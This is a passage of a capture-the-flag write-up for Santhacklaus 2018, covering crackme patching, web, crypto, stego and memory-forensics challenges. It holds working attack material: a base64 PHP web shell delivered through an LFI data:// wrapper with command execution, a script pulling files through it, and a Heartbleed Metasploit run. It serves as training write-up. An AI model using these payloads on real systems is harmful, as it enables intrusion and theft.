$ cat part3.txt 
F0r3ns1cCLUB
```

> part3 = F0r3ns1cCLUB

## Flag

> IMTLD{WELC0M3_toTh3_F0r3ns1cCLUB}

# Crackme_2

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | Crackme_2       | Crackme         |   250    | ~ 90     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_crackme2.png)
_Fig 1_: "Crackme_2" statement
</center>

## State of the art

This binary look like `crackme_1`. Then I tried my `ltrace` and nothing... 

<center>
![](/img/writeups/santhacklaus2018/crackme2_1.png)
_Fig 2_: ltrace test
</center>

Nevermind, let's open it in IDA.

## Static "analysis"

So, my analysis is very minimalist. I'm not a reverser and I'm not gonna try to understand the algorithm, but I will try to understand code flow.

<center>
![](/img/writeups/santhacklaus2018/crackme2_2.png)
_Fig 3_: IDA view
</center>

Open binary and jump to the interesting string: __Congratulation message__.

We can see on the picture above, on the right, a little block doing some loops, I think this block is decoding something or whatever.

We can also see two conditions:

* First is probably checking for the password (correct or not)
* Second for decoding the password in my opinion

But what could happen if I'm changing the `Jump if not zero` into `Jump if zero` ?

## Byte patching

I'm using a little hex editor called `HT Editor`: http://hte.sourceforge.net/downloads.html

Btw, you can byte patch with IDA or just change the ZFlag in GDB. But I want to use HT Editor :D

<center>
![](/img/writeups/santhacklaus2018/crackme2_3.png)
_Fig 4_: Addresses in IDA
</center>

By pressing space bar, I switch from box mode to line mode, in this mode I'm able to see addresses of each opcode.

```bash
$ ht crackme_2 
```

<center>
![](/img/writeups/santhacklaus2018/crackme2_4.png)
_Fig 5_: Condition to edit
</center>

According to: http://faydoc.tripod.com/cpu/jnz.htm

I edit `75` hex value into `74` hex value, save, and run the program again.

## Flag

<center>
![](/img/writeups/santhacklaus2018/crackme2_5.png)
_Fig 6_: Flag
</center>

# JeanClaude.VD

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | JeanClaude.VD       | Web-Guess         |   250    | ~ 55     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_jeanclaudevd.png)
_Fig 1_: "JeanClaude.VD" statement
</center>

## State of the art

As pentester, the first file that we have to check is: __robots.txt__

```bash
$ curl https://jeanclaudevd.santhacklaus.xyz/robots.txt
todo.txt
admin.html
```

## Curling all the things

```bash
$ curl https://jeanclaudevd.santhacklaus.xyz/todo.txt  
TO CHECK  Delete the admin page (server crashed while editing)
TO DO     Add a contact page
TO DO     Create a Facebook page
DONE      Watch Bloodsport
DONE      Drink water, regularly
```

Ok, so the administrator was editing the __admin.html__ webpage. The administrator must be a good guy, so he was probably using __vim__. Vim's temporary file has the following syntax:

> .filename.swp

Then:

```bash
$ curl https://jeanclaudevd.santhacklaus.xyz/.admin.html.swp
<HTML>
<HEAD> <TITLE>Admin</TITLE> </HEAD>
<BODY>
  <h2 class="tm-about-title">Administrator</h2>
  <IMG SRC="img/jcvd2.gif">
  <IMG SRC="img/jcvd3.gif">
  <IMG SRC="img/jcvd4.gif">
  <p class="tm-about-description">
  Congratz ! Here is the flag IMTLD{ID04L0t0f1s0m3tr1cs}
</BODY>
</HTML>
```

## Flag

> IMTLD{ID04L0t0f1s0m3tr1cs}

# Only numbers here

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | Only numbers here       | Prog         |   300    | ~ 25     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_onlynumbers.png)
_Fig 1_: "Only numbers here" statement
</center>

## State of the art

```bash
$ nc 51.75.202.113 20002                        
Welcome to this challenge !
You must find a good string
bitedepoulet
The string must end with "Pinkflood"
```

## Find the hash

This challenge broke my brain I think. I tried looooot of things, and the answer remains the same. At the end, I think about `Type juggling attack` in PHP. What would happen if I found a text ending with Pinkflood and gives me a MD5 hash containing only numbers?

## Scripting

```python
#!/usr/bin/pypy

import hashlib

i = 0
while 1:
  a = hashlib.md5(str(i)+"Pinkflood").hexdigest()
  if a.isdigit():
    print("{0}Pinkflood : {1}".format(i, a))
  i = i+1
```

`pypy` is fastest than `python2`.

```bash
$ ./bf.py 
1140633Pinkflood : 26062149783494508159682139582576
2293089Pinkflood : 30779574770132845832149204470045
18696276Pinkflood : 73885183743190612146875247615753
18716187Pinkflood : 12486779424170090450458074623834
21870313Pinkflood : 63660919203685129956461516827438
23342402Pinkflood : 40264813326696109876977252058734
26254213Pinkflood : 44900784602150912181870126246632
28726247Pinkflood : 50604678152856163642122024973076
31248448Pinkflood : 72452559495740519280516997363235

$ nc 51.75.202.113 20002
Welcome to this challenge !
You must find a good string
1140633Pinkflood
Congratz!!
Flag : IMTLD{Brut3F0rc31sTh3N3wBl4ck}
```

## Flag

> Flag : IMTLD{Brut3F0rc31sTh3N3wBl4ck}

# Be my valentine

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | Be my valentine       | Web         |   400    | ~ 40     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_valentine.png)
_Fig 1_: "Be my valentine" statement
</center>

## State of the art

I immediatly thought to heartbleed. I went on the website, and the SSL certificate was different than others web challenge...

<center>
![](https://media.giphy.com/media/l0HlMwZ0zBZxM2ukw/giphy.gif)
</center>

## Metasploit time

```bash
$ sudo  docker run --rm -it -p 443:443 -v ~/.msf4:/root/.msf4 -v /tmp/msf:/tmp/data remnux/metasploit

metasploitdocker $ msfconsole

msf5 search heartbleed
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                              Disclosure Date  Rank    Description
   ----                                              ---------------  ----    -----------
   auxiliary/scanner/ssl/openssl_heartbleed          2014-04-07       normal  OpenSSL Heartbeat (Heartbleed) Information Leak
   auxiliary/server/openssl_heartbeat_client_memory  2014-04-07       normal  OpenSSL Heartbeat (Heartbleed) Client Memory Exposure


msf5 use auxiliary/scanner/ssl/openssl_heartbleed

msf5 auxiliary(auxiliary/scanner/ssl/openssl_heartbleed) > show actions

Auxiliary actions:

   Name     Description
   ----     -----------
   Capture  


msf5 auxiliary(auxiliary/scanner/ssl/openssl_heartbleed) > set action DUMP
action => DUMP

msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set RHOSTS 51.75.202.113
RHOSTS => 51.75.202.113

msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set RPORT 1073
RPORT => 1073

msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set TLS_VERSION 1.2
TLS_VERSION => 1.2

msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set VERBOSE true
VERBOSE => true

msf5 auxiliary(scanner/ssl/openssl_heartbleed) > run
[...]
[*] 51.75.202.113:1073    - Printable info leaked:
......\....<.!......~..rO..3....E...C&..f.....".!.9.8.........5.............................3.2.....E.D...../...A.......................................w-form-urlencoded....IMTLD{I_Cl34n3d_Y0ur_D1rtY_H34rT_Sw33tY}....'T].T...QT......4.2.....................................................". .....................................Mon, 10 Dec
[...]
```

## Flag

> IMTLD{I_Cl34n3d_Y0ur_D1rtY_H34rT_Sw33tY}

# RandomScretmessAge

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | RandomScretmessAge       | Crypto         |   400    | ~ 40     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_randomsecretmessage.png)
_Fig 1_: "RandomScretmessAge" statement
</center>

## State of the art

The archive contains 3 files:

* encryptedKey
* encryptedMessage
* public.key

Obviously the entry point is the public key. Let's try to factor in the modulo of the key:

```bash
$ openssl rsa -in public.key -pubin -text -modulus 
RSA Public-Key: (2131 bit)
Modulus:
    05:e4:14:c3:38:98:4d:4b:7d:f2:be:20:93:f7:f7:
    83:48:fa:b0:bc:2c:ad:09:57:0e:41:08:f8:dd:a0:
    98:0a:4f:7e:66:a6:b8:5d:1c:fe:d4:43:b7:43:c8:
    c5:5b:8c:c2:54:9b:86:bf:84:f2:14:c7:a4:2f:aa:
    7a:cc:8c:a2:7b:9d:76:9e:f4:43:67:da:3d:0a:f8:
    e2:07:6c:48:ef:70:6f:a7:be:f7:81:61:5a:26:d9:
    e0:36:84:af:62:52:a9:01:ac:ad:07:e7:b9:7f:14:
    22:99:65:d1:83:ad:26:7a:eb:ff:0e:c5:ed:14:ac:
    33:f0:1d:6f:a2:3d:9e:14:49:f7:ec:a7:c7:ce:8c:
    d3:c2:4a:d0:64:ec:f5:f0:c5:49:70:8d:b6:cc:c0:
    f0:8c:55:4a:12:cb:a4:8c:d5:6a:0f:85:1c:f7:4a:
    68:25:b4:15:d3:b6:41:86:90:ed:d3:70:5d:b3:dc:
    b4:fe:1d:78:9f:6e:d5:4b:24:4b:c3:89:51:cd:f7:
    c2:11:05:9d:9f:ee:35:9a:12:10:0f:9e:d4:7d:a7:
    4d:33:4b:9c:bf:1c:91:ab:86:fc:b0:63:a7:70:f6:
    c4:70:bd:cd:60:eb:f9:62:c8:41:bb:ad:e5:c4:71:
    51:40:37:48:44:f2:9a:5d:51:78:3b:08:6b:ab:fa:
    5c:92:cc:1b:aa:0f:56:25:2f:75:64:33
Exponent: 65537 (0x10001)
Modulus=5E414C338984D4B7DF2BE2093F7F78348FAB0BC2CAD09570E4108F8DDA0980A4F7E66A6B85D1CFED443B743C8C55B8CC2549B86BF84F214C7A42FAA7ACC8CA27B9D769EF44367DA3D0AF8E2076C48EF706FA7BEF781615A26D9E03684AF6252A901ACAD07E7B97F14229965D183AD267AEBFF0EC5ED14AC33F01D6FA23D9E1449F7ECA7C7CE8CD3C24AD064ECF5F0C549708DB6CCC0F08C554A12CBA48CD56A0F851CF74A6825B415D3B6418690EDD3705DB3DCB4FE1D789F6ED54B244BC38951CDF7C211059D9FEE359A12100F9ED47DA74D334B9CBF1C91AB86FCB063A770F6C470BDCD60EBF962C841BBADE5C4715140374844F29A5D51783B086BABFA5C92CC1BAA0F56252F756433
writing RSA key
-----BEGIN PUBLIC KEY-----
MIIBLDANBgkqhkiG9w0BAQEFAAOCARkAMIIBFAKCAQsF5BTDOJhNS33yviCT9/eD
SPqwvCytCVcOQQj43aCYCk9+Zqa4XRz+1EO3Q8jFW4zCVJuGv4TyFMekL6p6zIyi
e512nvRDZ9o9CvjiB2xI73Bvp773gWFaJtngNoSvYlKpAaytB+e5fxQimWXRg60m
euv/DsXtFKwz8B1voj2eFEn37KfHzozTwkrQZOz18MVJcI22zMDwjFVKEsukjNVq
D4Uc90poJbQV07ZBhpDt03Bds9y0/h14n27VSyRLw4lRzffCEQWdn+41mhIQD57U
fadNM0ucvxyRq4b8sGOncPbEcL3NYOv5YshBu63lxHFRQDdIRPKaXVF4Owhrq/pc
kswbqg9WJS91ZDMCAwEAAQ==
-----END PUBLIC KEY-----

$ python -c "print(int('5E414C338984D4B7DF2BE2093F7F78348FAB0BC2CAD09570E4108F8DDA0980A4F7E66A6B85D1CFED443B743C8C55B8CC2549B86BF84F214C7A42FAA7ACC8CA27B9D769EF44367DA3D0AF8E2076C48EF706FA7BEF781615A26D9E03684AF6252A901ACAD07E7B97F14229965D183AD267AEBFF0EC5ED14AC33F01D6FA23D9E1449F7ECA7C7CE8CD3C24AD064ECF5F0C549708DB6CCC0F08C554A12CBA48CD56A0F851CF74A6825B415D3B6418690EDD3705DB3DCB4FE1D789F6ED54B244BC38951CDF7C211059D9FEE359A12100F9ED47DA74D334B9CBF1C91AB86FCB063A770F6C470BDCD60EBF962C841BBADE5C4715140374844F29A5D51783B086BABFA5C92CC1BAA0F56252F756433',16))"

230152398896492262062917148918939369015014118008521754032548535722623568807836513537632397474114638982139817176242926038563922451374734906474723194699186733981993080692084118938543671681218415674853397015772305693193080495161797442964189614747331265533790868829904995717880910750965489149821260489435560109415967653557264841805977201140711694719161091225610507928743832862244878002681898338427785672707004742713481053176255521113862812632505222790970858405544033198948553254981826681196797972439220360641118375422622406636642890247240882949568102579346403837896130334566480801945922807178359120965083164249882668632540394096519286553193047091
```

Go on: http://factordb.com

<center>
![](/img/writeups/santhacklaus2018/randommessage_1.png)
_Fig 2_: Factors
</center>

```raw
P = 6369464272063091

Q = 36133713773379110639156260809245710667249975097562535767006217344639401652545429184561670432654474685916444326329643261647839089779277922050876490310749777502134887001325019251594457313507648444893716167741071873690247544507901124644795185514523048177087583983446883357725075474454793584100416963202502865501677869411542007837316840565244878404910099258998767621377489314574579157689021034325071357685826056186366281177470036065239593291043613159095152517361284436054014254878411360973917732537367613163935385261628257586857455858546412331928149149513390186719329954080661111495911977853224786621480771096967827579842274824001
```

## Recover the private key

If the modulo (N) in RSA is not a prime number, then you can factor recover __P__  and __Q__, and then generate the private key. I used `rsactftool` to do that:

```bash
$ python2 ./RsaCtfTool.py --publickey ../public.key --private

-----BEGIN RSA PRIVATE KEY-----
MIIEUQIBAAKCAQsF5BTDOJhNS33yviCT9/eDSPqwvCytCVcOQQj43aCYCk9+Zqa4
XRz+1EO3Q8jFW4zCVJuGv4TyFMekL6p6zIyie512nvRDZ9o9CvjiB2xI73Bvp773
gWFaJtngNoSvYlKpAaytB+e5fxQimWXRg60meuv/DsXtFKwz8B1voj2eFEn37KfH
zozTwkrQZOz18MVJcI22zMDwjFVKEsukjNVqD4Uc90poJbQV07ZBhpDt03Bds9y0
/h14n27VSyRLw4lRzffCEQWdn+41mhIQD57UfadNM0ucvxyRq4b8sGOncPbEcL3N
YOv5YshBu63lxHFRQDdIRPKaXVF4Owhrq/pckswbqg9WJS91ZDMCAwEAAQKCAQsA
jkcjL+i2g9ouvR+7+QpAyRGGi77ukvrGf0sQBKu9qGkm6iVNVe8Aroyrla7Hhuyk
uSwVHlg2JxDWHKpLEMh43PFbG2Fky/Ezer6jnTuJs5b9NOUiEB7TWq2pKZtRLiVz
CAkYMVeT2VHbWOqU7VZr66P/oghvcSUpni5kSACDsIvWJNr5/nUDGBnSnjWMVCF9
W9cpElxop/wiw/1IOg/uYK2xHv5dDCK1yPPsiSj8ZLIT0RUciUSUQmXPQxSa9vIN
4zlRD0AFSLBXo0AiXIF5c/hLTOKeOUD9Q07O8/fkEQz9d7CQIDlwMELKROxk7H6K
y1rtBmo3VHdh/B/CoLpFx93+crmaSOW2WYECBxag/ndYinMCggEEQqTif+tJiKn4
fG5uGuMBVqBnT5YFq6mwa73c6eR5i1jsN0m2wNmnru4dODZn96Y2t58kGnNMrAZr
BqPg/5Hr/P0/p07nv3+KWR1Y2LZwehkKmBcJMRMU7bQeE5jgGutHBN3eVWphGzM0
jg3FQbJyVfEGoL5P8YmbOEnbaPHbtEInOXS587h60ZngGDe4zpjRj9HXq13fSbYi
3LbuJrgqru0E0u/z49PQkQyPwNMTYLFio2ekm23o/inZZAHEHPv86DIZIgJDNa1n
6Vr7qzRMI3c42LIpFUwC0m0elv9Pj6Szd5v5Xv1wzlw7GqIBdGLxM5hVmJMiPhil
721SVCOknEPMj0ECBxNbYnG65qsCggEEJET+K+YOT/1JCddDvwg6Sz3i29Jm5aTl
Kc3bs8MvTuInNHO+rTgHZVGbv2MEtCfWcZp/mJGVca3Qg32ezxhIWZguE00DHRo5
XgR1vQOVNS35sQoga3/aDP/QupOhq6TOMtzYyp2pmZcFjCX8a6PFS/Zvx/2rHmXo
fvrbGUM/cdvq4v8e0IBe/0GCT0vMHUvYCTCH8nCVO9WPJZW9CH+EY00FKhODJUO6
p6Yxehyl2CLR7uJSGHD5s5FtCVtYsvmFC41wVizrDQSBn+NvQh6lLUwOOQjFCR0k
EAdo9X6feyqErZzKW6MMyJIzbGws5H2QjabjNrUklqztad+SRc5cINtZMcECBxBu
4HDBiUQ=
-----END RSA PRIVATE KEY-----
```

Now, we got an encrypted key and the encrypted flag.  

It reminds me a little ransomware tricks: Encrypt data with a secret key in AES and encrypt the secret key with a public key in RSA and send it to the command and control server.

The attacker has to decrypt the encrypted AES secret key with his RSA private key.

## Recover the secret key

```bash
$ openssl rsautl -decrypt -in encryptedKey -inkey priv.key
My_WiF3_d0eSn’T_h4v3_T0_kN0w_Th1s_Symm3tr1k_k3Y
```

OpenSSL did the job. By guessing, I think the symmetrical cryptography used is AES-256-CBC.

Btw, the encryptMessage file contains OpenSSL magic number:

```bash
$ hexdump -C encryptedMessage 
00000000  53 61 6c 74 65 64 5f 5f  a9 18 48 41 30 3a 91 f4  |Salted__..HA0:..|
00000010  4a d7 9d 2a 1a 49 4d 29  3c a0 54 f3 8b 7d e5 5e  |J..*.IM)<.T..}.^|
00000020  e0 65 e1 f8 07 44 fb 65  2a 47 33 2d 72 6c b8 c2  |.e...D.e*G3-rl..|
00000030  45 4f 87 02 2d c7 8e f8  16 6c 5b 9d a4 b2 b4 9e  |EO..-....l[.....|
00000040

```

## Decrypt the file

```bash
$ openssl enc -aes-256-cbc -d -in encryptedMessage
enter aes-256-cbc decryption password:
*** WARNING : deprecated key derivation used.
Using -iter or -pbkdf2 would be better.
IMTLD{Th1S_w4s_4_R3allY_w3aK_RS4_k3y}
```

## Flag

> IMTLD{Th1S_w4s_4_R3allY_w3aK_RS4_k3y}

# 3D Industry 1/2

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | 3D Industry 1/2       | Web         |   400    | ~ 100     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_3dindustry_1.png)
_Fig 1_: "3D Industry" part 1 statement
</center>

## State of the art

Here the index page:

<center>
![](/img/writeups/santhacklaus2018/3dindustry1_1.png)
_Fig 2_: First part index
</center>

By browsing the website as a normal user, I noticed the __file__ GET parameter. It smells Local File Inclusion.

## Local File Inclusion -> RCE

I tried to use classical payload but nothing. In web pentest, when I run out of ideas, I'm going on Swissky's github: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal#lfi--rfi-using-wrappers

And obviously it was a good idea because the following payload works:

> data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=

If the above line returns "Shell done!", then the RCE is in place.

## Exploitation

> https://3d-industry.santhacklaus.xyz/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=

<center>
![](/img/writeups/santhacklaus2018/3dindustry1_2.png)
_Fig 3_: RCE in da place
</center>

Let's try the `id` linux command:

> https://3d-industry.santhacklaus.xyz/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&cmd=id

<center>
![](/img/writeups/santhacklaus2018/3dindustry1_3.png)
_Fig 4_: id linux command output
</center>

I have to find the flag:

> https://3d-industry.santhacklaus.xyz/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&cmd=ls%20-la

```bash
total 68
dr-xr-xr-x 8 1001 1001 4096 Dec 12 08:33 .
drwxr-xr-x 1 root root 4096 Dec 14 19:15 ..
-r-xr-xr-x 1 1001 1001 8196 Dec 12 08:33 .DS_Store
dr-xr-xr-x 3 1001 1001 4096 Dec 12 08:33 .hidden
-r-xr-xr-x 1 1001 1001  267 Dec 12 08:33 accueil.php
dr-xr-xr-x 3 1001 1001 4096 Dec 12 08:33 admin
dr-xr-xr-x 2 1001 1001 4096 Dec 12 08:33 config
-r-xr-xr-x 1 1001 1001  448 Dec 12 08:33 contact.php
-r-xr-xr-x 1 1001 1001  996 Dec 12 08:33 creations.php
dr-xr-xr-x 2 1001 1001 4096 Dec 12 08:33 inc
-r-xr-xr-x 1 1001 1001  580 Dec 12 08:33 index.php
dr-xr-xr-x 2 1001 1001 4096 Dec 12 08:33 lang
-r-xr-xr-x 1 1001 1001  125 Dec 12 08:33 lang.php
-r-xr-xr-x 1 1001 1001  461 Dec 12 08:33 services.php
dr-xr-xr-x 2 1001 1001 4096 Dec 12 08:33 style
```

There is an hidden directory `.hidden`... That contains a directory `this`... It will be a long trip...

> view-source:https://3d-industry.santhacklaus.xyz/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&cmd=ls%20-la%20.hidden

```bash
total 20
dr-xr-xr-x 3 1001 1001 4096 Dec 12 08:33 .
dr-xr-xr-x 8 1001 1001 4096 Dec 12 08:33 ..
-r-xr-xr-x 1 1001 1001 6148 Dec 12 08:33 .DS_Store
dr-xr-xr-x 3 1001 1001 4096 Dec 12 08:33 this
```

There are 5 or 6 directories nested together, so here is the final payload:

> view-source:https://3d-industry.santhacklaus.xyz/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&cmd=cat%20.hidden/this/is/the/path/to/the/flag/flag.txt

<center>
![](/img/writeups/santhacklaus2018/3dindustry1_4.png)
_Fig 5_: Flag :D
</center>

## Flag

> IMTLD{B3w4r30fURL1nclud3}

# 3D Industry 2/2

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | 3D Industry 2/2       | Stega         |   200    | ~ 63     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_3dindustry_2.png)
_Fig 1_: "3D Industry" part 2 statement
</center>

## State of the art

According to the previous part, we got an RCE on the web server. In the previous we browsed the `.hidden` directory to find the first flag.

Here the statement says: "some sensitives files he uploads in the administration section", near of the `.hidden` directory, there is an `admin` directory.

## Sensitive data

Still with the RCE, we can easily find: __admin/uploads/s3cr37-d0cum3n7.txt__

It contains a LOT of base64 data:

> view-source:https://3d-industry.santhacklaus.xyz/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&cmd=cat%20admin/uploads/s3cr37-d0cum3n7.txt

<center>
![](/img/writeups/santhacklaus2018/3dindustry2_1.png)
_Fig 2_: Secret file data
</center>

```python
#!/usr/bin/python3
import requests
import base64

r = requests.get("https://3d-industry.santhacklaus.xyz/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&cmd=cat%20admin/uploads/s3cr37-d0cum3n7.txt")

data = base64.b64decode(r.text.split('\n')[-13])

f = open('s3cr37-d0cum3n7.txt','wb')
f.write(data)
f.close()
```

```bash
$ extract.py 
$ file s3cr37-d0cum3n7.txt
s3cr37-d0cum3n7.txt: data

$ strings s3cr37-d0cum3n7.txt | less 
SketchUp STL com.sketchup.SketchUp.2018                                         
 AOq
 AOq
[...]

$ mv s3cr37-d0cum3n7.txt challenge.stl
```

Yay, sketchup file... :'(

## Open the STL data

In fact, you can download and use Sketchup viewer for free. But it's only available on Windows, and you need graphic acceleration to run the software (my virtual machine doesn't have this feature). So I just stole Haax's computer to open the file and get:

<center>
![](/img/writeups/santhacklaus2018/3dindustry2_2.jpg)
_Fig 3_: Secret file data
</center>

## Flag

> IMTLD{3d1s4w3s0m3}

# J.L.C.S.V.B.D

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | J.L.C.S.V.B.D       | Stega         |   450    | 34     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_jsvdlsb.png)
_Fig 1_: "J.L.C.S.V.B.D" statement
</center>

## State of the art

Ok, so we're starting with a beautiful picture of JCVD:

<center>
![](/img/writeups/santhacklaus2018/jcvdlsb_1.png)
_Fig 2_: Challenge material
</center>

The title gives me an hint about the trick to use: LSB. Then go to: https://incoherency.co.uk/image-steganography/#unhide
Or: https://aperisolve.fr

We can notice a little QR Code:

<center>
![](/img/writeups/santhacklaus2018/jcvdlsb_2.png)
_Fig 3_: QRCode
</center>

We can see a kind of grid, maybe LSB every two pixels.

## Extraction

In fact there are 3 QR Code inside the picture, one qr code for each color layer (red, blue, green).

```python
#!/usr/bin/python2

from PIL import Image

im = Image.open('challenge.png')

lar = im.size[0]
hau = im.size[1]
orig_pix = im.load()

for k in range(0,3):
  bg = Image.new('RGB', (lar,hau), 'white')
  bg_pix = bg.load()
  final = []
  a = []
  for i in range(0,lar,2):
    buf = []
    for j in range(0,hau,2):
      red = orig_pix[i,j][0]
      green = orig_pix[i,j][1]
      blue = orig_pix[i,j][2]
      a = [red, green, blue]
      
      buf.append(red & 1)
      if a[k] & 1:
        bg_pix[i/2,j/2] = (255,255,255)
      else:
        bg_pix[i/2,j/2] = (0,0,0)
    final.append(buf)
  bg.save('qr'+str(k)+'.png')
```  

It gives those files:

<center>
![](/img/writeups/santhacklaus2018/qr0.png)
_Fig 4_: QRCode 1
</center>

<center>
![](/img/writeups/santhacklaus2018/qr1.png)
_Fig 5_: QRCode 2
</center>

<center>
![](/img/writeups/santhacklaus2018/qr2.png)
_Fig 6_: QRCode 3
</center>

## Flag

```bash
$ for i in {0..2}; do zbarimg -q --raw qr$i.png; done | tr -d '\n'
IMTLD{st3g4n0Gr4pHY_s0m3t1M35_n33d5_s0m3_gu3sSiNg}
```

# Bret Stiles

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | Bret Stiles       | Forensic         |   500    | 23     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_bretstiles.png)
_Fig 1_: Bret Stiles statement
</center>

## State of the art

A memory dump <3

<center>
![](https://media.giphy.com/media/8g63zqQ5RPt60/giphy.gif)
</center>

```bash
$ volatility -f challenge.dmp imageinfo
[Some garbage errors]
Suggested Profile(s) : Win10x64_17134, Win10x64_10240_17770, Win10x64_14393, Win10x64_10586, Win10x64, Win2016x64_14393, Win10x64_16299, Win10x64_15063 (Instantiated with Win10x64_15063)
                     AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS)
                     AS Layer2 : WindowsCrashDumpSpace64 (Unnamed AS)
                     AS Layer3 : FileAddressSpace (/home/monique/Téléchargements/bretstiles/challenge.dmp)
                      PAE type : No PAE
                           DTB : 0x1aa000L
                          KDBG : 0xf80150ad4a60L
          Number of Processors : 1
     Image Type (Service Pack) : 0
                KPCR for CPU 0 : 0xfffff80150b2d000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2018-11-05 20:50:14 UTC+0000
     Image local date and time : 2018-11-05 12:50:14 -0800
```

Yay Windows 10... :'(

## Find the right profile

First things to do is finding the correct Windows 10 profile for volatility. After some test, I finally find: `Win10x64_10586`

```bash
$ volatility -f challenge.dmp --profile=Win10x64_10586 pstree

Name                                                  Pid   PPid   Thds   Hnds Time
-------------------------------------------------- ------ ------ ------ ------ ----
 0xffffe0009342b680:System                              4      0    103      0 2018-11-05 20:47:01 UTC+0000
. 0xffffe00094897040:smss.exe                         272      4      3      0 2018-11-05 20:47:01 UTC+0000
.. 0xffffe000952c6080:smss.exe                        412    272      0 ------ 2018-11-05 20:47:08 UTC+0000
... 0xffffe000951e8540:csrss.exe                      432    412     10      0 2018-11-05 20:47:08 UTC+0000
... 0xffffe00095395080:winlogon.exe                   484    412      5      0 2018-11-05 20:47:08 UTC+0000
.... 0xffffe0009566d640:dwm.exe                       772    484     12      0 2018-11-05 20:47:09 UTC+0000
.... 0xffffe00095ddc680:userinit.exe                 2332    484      0 ------ 2018-11-05 20:47:33 UTC+0000
..... 0xffffe00095dda500:explorer.exe                2348   2332     58      0 2018-11-05 20:47:33 UTC+0000
...... 0xffffe00096164080:OneDrive.exe               3328   2348     18      0 2018-11-05 20:47:53 UTC+0000
...... 0xffffe000961ae3c0:mspaint.exe                3372   2348      7      0 2018-11-05 20:47:56 UTC+0000
...... 0xffffe000961257c0:VBoxTray.exe               3252   2348     13      0 2018-11-05 20:47:52 UTC+0000
...... 0xffffe0009474f080:cmd.exe                    2144   2348      5      0 2018-11-05 20:50:05 UTC+0000
....... 0xffffe00094841080:conhost.exe               3352   2144      3      0 2018-11-05 20:50:05 UTC+0000
 0xffffe00095df8080:NisSrv.exe                       2112    524      7      0 2018-11-05 20:47:30 UTC+0000
[...]
```

It looks to work, let's continue the analysis.

## File list

In a forensic challenge, I immediately list all opened file in memory, using `filescan` plugin:

```bash
$ volatility -f challenge.dmp --profile=Win10x64_10586 filescan > filescan.txt 

$ cat filescan.txt| grep John | grep Desktop
0x0000e000948df780  32768      1 R--rwd \Device\HarddiskVolume2\Users\John\Desktop
0x0000e000956917a0      2      0 R--rwd \Device\HarddiskVolume2\Users\John\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Desktop.ini
0x0000e00095e65320  32768      1 R--rwd \Device\HarddiskVolume2\Users\John\Desktop
0x0000e00095f03090     16      0 R--rwd \Device\HarddiskVolume2\Users\John\Desktop\desktop.ini
0x0000e0009600df20      2      0 R--rwd \Device\HarddiskVolume2\Users\John\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Desktop.ini
0x0000e00096087a20      2      0 R--rwd \Device\HarddiskVolume2\Users\John\AppData\Roaming\Microsoft\Windows\SendTo\Desktop.ini
0x0000e0009608abe0      8      0 R--r-d \Device\HarddiskVolume2\Users\John\Desktop\bob.png
0x0000e000960c0700  32768      1 R--rw- \Device\HarddiskVolume2\Users\John\Desktop
```

We can notice "bob.png" on the Desktop, let's extract it:

```bash
$ volatility -f challenge.dmp --profile=Win10x64_10586 dumpfiles -Q 0x0000e000960c0700 -D .
```

Aaaaaaaaaand... Nothing. Ok, not a problem, I got more than one trick in my hat :D

